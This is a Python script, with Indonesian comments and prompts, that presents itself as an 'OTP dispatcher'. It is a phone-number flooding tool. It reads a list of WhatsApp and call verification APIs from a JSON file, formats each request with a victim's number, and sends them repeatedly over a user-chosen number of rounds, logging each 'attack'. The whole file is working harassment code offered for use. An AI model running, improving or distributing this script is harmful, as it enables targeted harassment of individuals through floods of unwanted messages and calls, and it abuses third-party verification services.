import json, requests, time, os, random

# Warna ANSI (Biar Gahar)
G = '\033[92m'; R = '\033[91m'; W = '\033[97m'; Y = '\033[93m'; B = '\033[94m'

def banner():
    os.system('clear')
    print(f"{B}╔══════════════════════════════════════════╗")
    print(f"{B}║{W}       SZN-OTP DISPATCHER PRO v6        {B}║")
    print(f"{B}║{Y}    Dev: anonymusyogyakarta-coder       {B}║")
    print(f"{B}╚══════════════════════════════════════════╝{W}\n")

def load_api():
    try:
        with open('lib/api.json', 'r') as f:
            return json.load(f)
    except:
        print(f"{R}[!] Error: File lib/api.json tidak ditemukan!{W}")
        return None

def gas_pol(target, total, delay):
    db = load_api()
    if not db: return
    
    # Bersihkan nomor
    if target.startswith("0"): bersih = target[1:]
    elif target.startswith("62"): bersih = target[2:]
    else: bersih = target
    t_full = "+62" + bersih
    t_biasa = bersih

    for i in range(total):
        print(f"{Y}[ Serangan ke-{i+1} ]{W}")
        # Gabungkan semua API (WA + Call)
        semua_api = db['whatsapp'] + db['call']
        
        for api in semua_api:
            try:
                # Format data otomatis
                u = api['url'].format(target_full=t_full, target_tanpa_62=t_biasa)
                d = api['data']
                if d:
                    for k, v in d.items():
                        if isinstance(v, str): d[k] = v.format(target_full=t_full, target_tanpa_62=t_biasa)
                
                headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
                
                if api['method'] == "POST":
                    r = requests.post(u, json=d, headers=headers, timeout=10)
                else:
                    r = requests.get(u, headers=headers, timeout=10)

                if r.status_code in [200, 201]:
                    print(f"  {G}√ {api['name']}{W} -> OTP Terkirim")
                else:
                    print(f"  {R}x {api['name']}{W} -> Limit/Gagal")
            except:
                print(f"  {R}x {api['name']}{W} -> Server Timeout")
            time.sleep(2) # Jeda antar API
            
        print(f"{B}--- Menunggu {delay} detik ---{W}\n")
        time.sleep(delay)

banner()
target = input(f"{W}Masukkan Nomor Target: {G}")
jumlah = int(input(f"{W}Jumlah Serangan: {G}"))
jeda = int(input(f"{W}Jeda (Detik): {G}"))

gas_pol(target, jumlah, jeda)
        
